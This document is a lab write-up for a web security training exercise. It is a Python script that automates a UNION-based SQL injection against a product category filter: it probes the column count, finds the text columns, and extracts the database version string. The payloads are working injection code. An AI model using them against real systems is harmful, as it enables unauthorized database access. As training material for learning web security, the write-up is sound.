# SQL injection attack, querying the database type and version on MySQL and Microsoft

> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

> To solve the lab, display the database version string.

```python
import requests
import sys
from bs4 import BeautifulSoup

# --- Configuration ---
# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
BASE_URL = "https://0adb00c70396af1a81ddc0a100b10003.web-security-academy.net/"
PATH = "/filter"
TARGET_URL = BASE_URL + PATH

def get_num_columns(url):
    """
    Determines the number of columns using UNION SELECT.
    For MySQL/Microsoft, no 'FROM' clause is needed.
    """
    print(f"[*] Probing {url} for column count...")
    for i in range(1, 50):
        nulls = ["NULL"] * i
        null_string = ", ".join(nulls)
        
        # Note: The space after '--' is critical for MySQL comment syntax.
        payload = {
            "category": f"' UNION SELECT {null_string} -- "
        }
        
        # Simple progress indicator
        sys.stdout.write(f"\r[-] Testing column count: {i}")
        sys.stdout.flush()
        
        response = requests.get(url, params=payload)
        
        if response.status_code == 200:
            print(f"\n[+] Found correct number of columns: {i}")
            return i
            
    print("\n[-] Error: Could not determine column count.")
    return None

def get_text_columns(url, num_cols):
    """
    Identifies which columns can hold string data.
    """
    print("[*] Identifying text-compatible columns...")
    text_cols = []
    
    for i in range(num_cols):
        # Create a fresh list for every iteration to prevent data contamination
        nulls = ["NULL"] * num_cols
        nulls[i] = "'abc'"
        null_string = ", ".join(nulls)
        
        payload = {
            "category": f"' UNION SELECT {null_string} -- "
        }
        
        sys.stdout.write(f"\r[-] Testing column index: {i}")
        sys.stdout.flush()
        
        response = requests.get(url, params=payload)
        
        if response.status_code == 200:
            text_cols.append(i)
            
    print(f"\n[+] Text columns found at indices: {text_cols}")
    return text_cols

def get_db_version(url, num_cols, txt_indices):
    """
    Extracts the @@version variable (Standard for MySQL and MSSQL).
    """
    if not txt_indices:
        print("[-] Error: No text columns available.")
        return

    print("[*] Extracting Database version...")
    
    # Target the first valid text column
    nulls = ["NULL"] * num_cols
    nulls[txt_indices[0]] = "@@version"
    null_string = ", ".join(nulls)
    
    payload = {
        "category": f"' UNION SELECT {null_string} -- "
    }
    
    response = requests.get(url, params=payload)
    
    if response.status_code == 200:
        print("[+] Injection Successful. Parsing response...")
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # --- THE ADVANCED ONE-LINER ---
        # Find the first <td> or <th> tag that contains our keywords.
        # This ignores <h1> (Titles) and <div> automatically.
        res = soup.find(lambda t: t.name in ['td', 'th'] and ("ubuntu" in t.text or "Microsoft" in t.text))
        
        if res:
            print(f"\n[SUCCESS] Database Version: {res.text.strip()}")
        else:
            print("[-] Version not found.")


if __name__ == "__main__":
    numberof_columns = get_num_columns(TARGET_URL)
    
    if numberof_columns:
        text_column_indices = get_text_columns(TARGET_URL, numberof_columns)
        
        if text_column_indices:
            get_db_version(TARGET_URL, numberof_columns, text_column_indices)
```